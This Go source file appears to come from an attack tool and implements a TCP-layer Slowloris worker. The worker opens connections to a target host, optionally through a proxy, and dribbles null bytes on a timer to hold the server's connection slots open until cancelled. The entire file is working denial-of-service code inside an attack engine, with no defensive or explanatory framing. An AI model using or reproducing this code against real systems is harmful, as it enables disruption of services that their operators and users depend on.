package tcp

import (
	"bufio"
	"context"
	"fmt"
	"net"
	"time"

	core "github.com/sammwyy/mikumikubeam/internal/engine"
	"github.com/sammwyy/mikumikubeam/internal/netutil"
)

// slowlorisWorker opens a TCP connection and keeps it alive by dribbling tiny
// chunks of data on a timer, never finishing/introducing a full frame. It
// occupies server connection slots like the HTTP Slowloris but at the TCP layer.
type slowlorisWorker struct{}

func NewSlowlorisWorker() *slowlorisWorker { return &slowlorisWorker{} }

func (w *slowlorisWorker) Fire(ctx context.Context, params core.AttackParams, p core.Proxy, ua string, logCh chan<- core.AttackStats) error {
	tn := params.TargetNode
	host := tn.Hostname()
	port := tn.PortNum()
	if host == "" || port <= 0 {
		return nil
	}

	var pptr *core.Proxy
	if p.Host != "" {
		pptr = &p
	}
	// Need a direct dial; the write-loop runs in a goroutine below.
	conn, err := netutil.DialedTCPClient(ctx, "tcp", host, port, pptr)
	if err != nil {
		return err
	}

	core.SendAttackLogIfVerbose(logCh, p, params.Target, params.Verbose)

	// Keep the connection alive by periodically dribbling bytes, never
	// completing a full frame so the connection stays open until cancelled.
	go func(c net.Conn) {
		defer c.Close()
		bw := bufio.NewWriter(c)

		// Dribble a few bytes to establish the socket is live.
		_, _ = fmt.Fprintf(bw, "\x00\x00")
		bw.Flush()

		ticker := time.NewTicker(params.PacketDelay)
		if params.PacketDelay <= 0 {
			ticker.Stop()
			ticker = time.NewTicker(30 * time.Second)
		}
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				_, _ = bw.WriteString("\x00")
				_ = bw.Flush()
			}
		}
	}(conn)

	return nil
}
